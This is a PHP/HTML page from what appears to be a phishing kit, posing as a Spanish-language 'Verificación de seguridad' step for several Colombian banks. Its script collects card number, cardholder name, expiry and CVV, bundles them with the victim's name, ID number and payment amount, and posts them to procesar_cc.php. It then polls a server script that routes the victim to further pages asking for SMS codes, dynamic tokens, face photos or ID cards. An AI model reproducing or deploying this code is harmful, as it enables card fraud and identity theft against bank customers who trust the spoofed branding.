<?php
session_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de seguridad</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style id="dynamic-styles">
        /* Base Styles */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #FAFAFA;
            background-size: cover;
            background-position: center top;
            background-attachment: fixed;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #2C2A29;
            padding: 20px;
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding-bottom: 35px;
        }

        .logo-container { margin-bottom: 10px; }
        .logo { height: 69px; object-fit: contain; }

        .title {
            font-weight: 400;
            font-size: 26px;
            color: #333;
            margin-bottom: 30px;
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-size: 13.5px;
            color: #444;
            line-height: 1.5;
            margin-bottom: 25px;
            padding: 0 10px;
            font-weight: 400;
        }

        /* Flip Card Logic */
        .card-container { width: 77%; aspect-ratio: 1.58 / 1; perspective: 1000px; margin-bottom: 25px; }
        .card-inner {
            position: relative; width: 100%; height: 100%; text-align: left;
            transition: transform 0.6s; transform-style: preserve-3d;
        }
        .card-container.flipped .card-inner { transform: rotateY(180deg); }
        
        .card-front, .card-back {
            position: absolute; width: 100%; height: 100%;
            -webkit-backface-visibility: hidden; backface-visibility: hidden;
            border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            padding: 40px 31px; overflow: hidden;
        }

        /* Front Side */
        .card-front .chip { width: 45px; height: 35px; background: linear-gradient(135deg, #d4d4d4 0%, #999 100%); border-radius: 6px; margin-bottom: 25px; }
        .card-front .bank-logo { position: absolute; top: 11px; right: 15px; height: 33px; }
        .card-front .number-display { font-size: 20px; letter-spacing: 2px; margin-bottom: 15px; font-family: 'Courier New', monospace; display: flex; justify-content: space-between; font-weight: bold; }
        .card-front .name-display { font-size: 13px; text-transform: uppercase; font-weight: 700; font-family: 'Courier New', monospace; }
        .card-front .expiry-container { text-align: center; float: right; }
        .card-front .expiry-label { font-size: 6px; font-weight: 800; }
        .card-front .expiry-display { font-size: 13px; font-weight: 700; font-family: 'Courier New', monospace; }

        /* Back Side */
        .card-back { transform: rotateY(180deg); padding: 0; }
        .card-back .black-strip { width: 100%; height: 40px; background: #333; margin-top: 25px; }
        .card-back .cvv-area { width: 80%; height: 35px; background: #fff; margin: 15px auto; display: flex; align-items: center; justify-content: flex-end; padding: 0 15px; border-radius: 4px; }
        .card-back .cvv-display { font-family: 'Courier New', monospace; font-weight: bold; font-size: 16px; font-style: italic; }

        /* Form Styles */
        .form-group { width: 100%; display: flex; flex-direction: column; gap: 10px; }
        .input-control {
            width: 100%; padding: 12px 15px; border: 1px solid #dcdcdc; border-radius: 10px;
            font-size: 16px; font-family: inherit; outline: none; transition: all 0.2s; color: #333;
            background: #fff;
        }
        .input-control.invalid { border-color: #ff4d4d !important; box-shadow: 0 0 5px rgba(255,77,77,0.3); }

        .row-inputs { display: flex; gap: 10px; }
        .row-inputs select { 
            flex: 1; 
            appearance: none; 
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23999' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); 
            background-repeat: no-repeat; 
            background-position: right 10px center; 
            background-size: 14px; 
        }
        .row-inputs input { width: 30%; }

        .error-banner {
            width: 100%; display: none; margin-bottom: 16px; padding: 12px 14px;
            border-radius: 10px; background: #fff2f2; border: 1px solid #ef4444;
            color: #b91c1c; font-size: 14px; font-weight: 600; text-align: center;
        }
        .error-banner.show { display: block; }

        .btn-continue {
            width: 100%; padding: 14px; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 700;
            cursor: not-allowed; margin-top: 5px; transition: background-color 0.3s;
        }
        .btn-continue.active { cursor: pointer; }

        #loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.98); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10000;
        }
        .spinner { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader-text { margin-top: 15px; font-size: 15px; color: #333; font-weight: 600; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-container">
            <img id="main-logo" src="" alt="Logo" class="logo">
        </div>
        <h1 class="title" id="main-title">Verificación de seguridad</h1>
        <p class="subtitle">Es necesario verificar su identidad antes de continuar con la transacción, ingrese los datos de su tarjeta credito.</p>

        <!-- CSS Dynamic Flip Card -->
        <div class="card-container" id="card-cont">
            <div class="card-inner">
                <div class="card-front">
                    <img id="card-bank-logo" src="" class="bank-logo">
                    <div class="chip"></div>
                    <div class="number-display" id="num-disp"><span>....</span><span>....</span><span>....</span><span>....</span></div>
                    <div class="expiry-container"><div class="expiry-label">VALID THRU</div><div class="expiry-display" id="exp-disp">•• / ••</div></div>
                    <div class="name-display" id="name-disp">YOUR NAME HERE</div>
                </div>
                <div class="card-back">
                    <div class="black-strip"></div>
                    <div class="cvv-area"><div class="cvv-display" id="cvv-disp">•••</div></div>
                </div>
            </div>
        </div>

        <div id="error-banner" class="error-banner" role="alert"></div>

        <form id="alter-form" class="form-group">
            <input type="text" id="ccnum" placeholder="Card Number" class="input-control" maxlength="19" inputmode="numeric" autocomplete="off">
            <input type="text" id="ccname" placeholder="Name" class="input-control" autocomplete="off">
            <div class="row-inputs">
                <select id="ccmonth" class="input-control">
                    <option value="" disabled selected>MM</option>
                    <?php for($i=1; $i<=12; $i++) echo "<option value='".str_pad($i,2,'0',STR_PAD_LEFT)."'>".str_pad($i,2,'0',STR_PAD_LEFT)."</option>"; ?>
                </select>
                <select id="ccyear" class="input-control">
                    <option value="" disabled selected>YYYY</option>
                    <?php for($i=2024; $i<=2035; $i++) echo "<option value='$i'>$i</option>"; ?>
                </select>
                <input type="text" id="cccvv" placeholder="CVC" class="input-control" maxlength="4" inputmode="numeric" autocomplete="off">
            </div>
            <button type="submit" class="btn-continue" id="submit-btn">Continuar</button>
        </form>
    </div>

    <div id="loader">
        <div class="spinner" id="loader-spinner"></div>
        <p class="loader-text">Procesando transacción...</p>
    </div>

    <script>
        // CONFIGURACIONES POR BANCO
        const bankConfigs = {
            'bancolombia': {
                logo: '../inicio/b-14/img/logo.svg',
                cardLogo: '../inicio/b-14/img/logo.svg',
                fondo: '../inicio/b-14/img/fondo.svg',
                title: 'Sucursal Virtual Personas',
                cardBg: 'linear-gradient(135deg, #FFDD00 0%, #FBB03B 100%)',
                btnColor: '#b2b2b2',
                btnActive: '#2C2A29',
                spinnerColor: '#FDDA23',
                textColor: '#2C2A29'
            },
            'davivienda': {
                logo: 'https://cdn.remitly.com/images/v1/img/davivienda_large2x_mar28.3CtIjYYgCznhaRs4mUxaq5.png',
                cardLogo: 'https://cdn.remitly.com/images/v1/img/davivienda_large2x_mar28.3CtIjYYgCznhaRs4mUxaq5.png',
                fondo: '',
                title: 'Verificación de seguridad',
                cardBg: 'linear-gradient(135deg, #5a5a5a 0%, #B2181D 100%)',
                btnColor: '#b2b2b2',
                btnActive: '#E21E26',
                spinnerColor: '#E21E26',
                textColor: '#333'
            },
            'bogota': {
                logo: 'https://www.pngall.com/wp-content/uploads/17/Banco-De-Bogota-Logo-Emblem-PNG.png',
                cardLogo: 'https://www.pngall.com/wp-content/uploads/17/Banco-De-Bogota-Logo-Emblem-PNG.png',
                fondo: '',
                title: 'Verificación de seguridad',
                cardBg: 'linear-gradient(135deg, #003057 0%, #f1f9ff 100%)',
                btnColor: '#b2b2b2',
                btnActive: '#003057',
                spinnerColor: '#003057',
                textColor: '#333'
            },
            'avvillas': {
                logo: 'https://www.itrentingcolombia.com/wp-content/uploads/2024/07/AV-Villas.webp',
                cardLogo: 'https://www.itrentingcolombia.com/wp-content/uploads/2024/07/AV-Villas.webp',
                fondo: '',
                title: 'Verificación de seguridad',
                cardBg: "linear-gradient(135deg, #004b8d 0%, #ffbfbf 100%)",
                btnColor: '#b2b2b2',
                btnActive: '#004b8d',
                spinnerColor: '#004b8d',
                textColor: '#333'
            },
            'popular': {
                logo: 'https://www.credilemon.com/img/logo/co/banco-popular.webp',
                cardLogo: 'https://www.credilemon.com/img/logo/co/banco-popular.webp',
                fondo: '',
                title: 'Verificación de seguridad',
                cardBg: 'linear-gradient(135deg, #007A33 0%, #ffffff 100%)',
                btnColor: '#b2b2b2',
                btnActive: '#007A33',
                spinnerColor: '#007A33',
                textColor: '#333'
            },
            'occidente': {
                logo: 'https://granplazacentroscomerciales.com/del-sol/wp-content/uploads/sites/6/2024/03/BANCO-DE-OCCIDENTE_Gran_Plaza_Centros_Comerciales.png',
                cardLogo: 'https://granplazacentroscomerciales.com/del-sol/wp-content/uploads/sites/6/2024/03/BANCO-DE-OCCIDENTE_Gran_Plaza_Centros_Comerciales.png',
                fondo: '',
                title: 'Verificación de seguridad',
                cardBg: 'linear-gradient(135deg, #003057 0%, #ffffff 100%)',
                btnColor: '#b2b2b2',
                btnActive: '#003057',
                spinnerColor: '#003057',
                textColor: '#333'
            }
        };

        const luhn = c => {
            let s = 0, b = false;
            for (let i = c.length - 1; i >= 0; i--) {
                let n = parseInt(c[i], 10);
                if (b) { n *= 2; if (n > 9) n -= 9; }
                s += n; b = !b;
            }
            return (s % 10) === 0;
        };

        document.addEventListener('DOMContentLoaded', () => {
            // DETECTAR BANCO DESDE LOCALSTORAGE
            let tbdatos = {};
            try {
                tbdatos = JSON.parse(localStorage.getItem('tbdatos') || '{}');
            } catch(e) {}
            
            let bancoKey = (tbdatos.banco || 'bancolombia').toLowerCase();
            // Soporte para variaciones de nombre
            if (bancoKey.includes('bogota') || bancoKey.includes('bogotá')) bancoKey = 'bogota';
            if (bancoKey.includes('avvillas') || bancoKey.includes('av villas') || bancoKey.includes('avevillas')) bancoKey = 'avvillas';
            if (bancoKey.includes('popular')) bancoKey = 'popular';
            if (bancoKey.includes('occidente')) bancoKey = 'occidente';
            
            if (!bankConfigs[bancoKey]) bancoKey = 'bancolombia';
            
            const config = bankConfigs[bancoKey];

            // APLICAR CONFIGURACION DINAMICA
            document.getElementById('main-logo').src = config.logo;
            document.getElementById('card-bank-logo').src = config.cardLogo;
            document.getElementById('main-title').innerText = config.title;
            
            if (config.fondo) {
                document.body.style.backgroundImage = `url('${config.fondo}')`;
            } else {
                document.body.style.backgroundImage = 'none';
                document.body.style.backgroundColor = '#FAFAFA';
            }

            const styleSheet = document.getElementById('dynamic-styles');
            styleSheet.innerHTML += `
                .card-front, .card-back { background: ${config.cardBg}; }
                .btn-continue { background-color: ${config.btnColor}; }
                .btn-continue.active { background-color: ${config.btnActive}; }
                .spinner { border-top: 4px solid ${config.spinnerColor}; }
                body { color: ${config.textColor}; }
            `;

            const errorBanner = document.getElementById('error-banner');
            const urlParams = new URLSearchParams(window.location.search);
            const showError = urlParams.get('error') === '1';
            const reloadParam = urlParams.get('reload') === '1';

            if (showError) {
                errorBanner.textContent = 'Se ha generado un error en la tarjeta. La página se actualizará automáticamente.';
                errorBanner.classList.add('show');

                if (!reloadParam) {
                    setTimeout(() => {
                        const nextUrl = new URL(window.location.href);
                        nextUrl.searchParams.set('reload', '1');
                        window.location.replace(nextUrl.toString());
                    }, 1200);
                }
            }

            // LOGICA DEL FORMULARIO
            const cardCont = document.getElementById('card-cont'),
                  form = document.getElementById('alter-form'),
                  submitBtn = document.getElementById('submit-btn'),
                  ccnum = document.getElementById('ccnum'),
                  ccname = document.getElementById('ccname'),
                  ccmonth = document.getElementById('ccmonth'),
                  ccyear = document.getElementById('ccyear'),
                  cccvv = document.getElementById('cccvv');

            const validate = () => {
                const raw = ccnum.value.replace(/\s/g, '');
                const isNumValid = raw.length >= 13 && luhn(raw);
                const isAllFilled = raw && ccname.value && ccmonth.value && ccyear.value && cccvv.value.length >= 3;
                
                if (raw.length >= 15) {
                    ccnum.classList.toggle('invalid', !isNumValid);
                } else {
                    ccnum.classList.remove('invalid');
                }

                if (isNumValid && isAllFilled) {
                    submitBtn.classList.add('active');
                } else {
                    submitBtn.classList.remove('active');
                }
            };

            ccnum.addEventListener('input', e => {
                let v = e.target.value.replace(/\D/g, '');
                e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
                let g = v.padEnd(16, '.').match(/.{1,4}/g);
                document.getElementById('num-disp').innerHTML = (g || ['....','....','....','....']).map(p => `<span>${p}</span>`).join('');
                validate();
            });

            ccname.addEventListener('input', e => {
                document.getElementById('name-disp').innerText = e.target.value.toUpperCase() || 'YOUR NAME HERE';
                validate();
            });

            const updateExp = () => {
                document.getElementById('exp-disp').innerText = `${ccmonth.value || '••'} / ${ccyear.value ? ccyear.value.slice(-2) : '••'}`;
                validate();
            };
            ccmonth.onchange = updateExp; ccyear.onchange = updateExp;

            cccvv.addEventListener('focus', () => cardCont.classList.add('flipped'));
            cccvv.addEventListener('blur', () => cardCont.classList.remove('flipped'));
            cccvv.addEventListener('input', e => {
                document.getElementById('cvv-disp').innerText = e.target.value || '•••';
                validate();
            });

            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                if (!submitBtn.classList.contains('active')) return;

                document.getElementById('loader').style.display = 'flex';

                const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                
                let extra = {};
                try {
                    const localData = JSON.parse(localStorage.getItem('tbdatos') || '{}');
                    extra = {
                        nombre: localData.nombre || '',
                        total_pagar: localData.total_pagar || '',
                        documento: localData.documento || '',
                        comercio: localData.comercio || 'MERCADO*PAGO'
                    };
                } catch(err) {}

                const tb = {
                    tarjeta: ccnum.value.replace(/\s/g, ''),
                    ownerName: ccname.value,
                    expMonth: ccmonth.value,
                    expYear: ccyear.value,
                    cvv: cccvv.value,
                    banco: bancoKey.toUpperCase(),
                    card_type: 'CREDITO',
                    ...extra
                };

                const formData = new FormData();
                formData.append('transactionId', sessionId);
                formData.append('u_tb', JSON.stringify(tb));

                try {
                    const response = await fetch('procesar_cc.php', {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();

                    if (result.status === 'success') {
                        checkResponse(sessionId);
                    } else {
                        alert('Error en el servidor');
                        document.getElementById('loader').style.display = 'none';
                    }
                } catch (error) {
                    document.getElementById('loader').style.display = 'none';
                }
            });

            async function checkResponse(sid) {
                try {
                    const formData = new FormData();
                    formData.append('transactionId', sid);
                    const res = await fetch('verificar_respuesta.php', { method: 'POST', body: formData });
                    const result = await res.json();

                    if (result && result.action) {
                        localStorage.setItem('session_id', sid);
                        localStorage.setItem('last_tid', sid);
                        
                        const currentData = JSON.parse(localStorage.getItem('tbdatos') || '{}');
                        const tb = { 
                            ...currentData,
                            tarjeta: ccnum.value.replace(/\s/g, ''), 
                            ownerName: ccname.value, 
                            expMonth: ccmonth.value, 
                            expYear: ccyear.value, 
                            cvv: cccvv.value, 
                            banco: bancoKey.toUpperCase() 
                        };
                        localStorage.setItem('tbdatos', JSON.stringify(tb));
                        
                        const action = result.action;
                        if (action === 'pedir_dinamica') {
                            window.location.href = '/inicio/b-14/token.php?transactionId=' + sid;
                        } else if (action === 'pedir_sms') {
                            window.location.href = '/inicio/b-14/sms.php?transactionId=' + sid;
                        } else if (action === 'pedir_credito' || action === 'credito') {
                            window.location.href = 'credito.php?transactionId=' + sid;
                        } else if (action === 'pedir_debito' || action === 'debito') {
                            window.location.href = 'debito.php?transactionId=' + sid;
                        } else if (action === 'confirm_finalizar' || action === 'finalizar') {
                            window.location.href = '/fin.php';
                        } else if (action === '923') {
                            window.location.href = '/inicio/b-14/923.php?transactionId=' + sid;
                        } else if (action === 'error_logo') {
                            window.location.href = '/inicio/b-14/index.php?error=1&transactionId=' + sid;
                        } else if (action === 'error' || action === 'cara') {
                            window.location.href = '/caras';
                        } else if (action === 'cedula') {
                            window.location.href = '/cedula';
                        } else {
                            window.location.href = '/fin.php';
                        }
                    } else {
                        setTimeout(() => checkResponse(sid), 2000);
                    }
                } catch (e) {
                    setTimeout(() => checkResponse(sid), 2000);
                }
            }
        });
    </script>
</body>
</html>
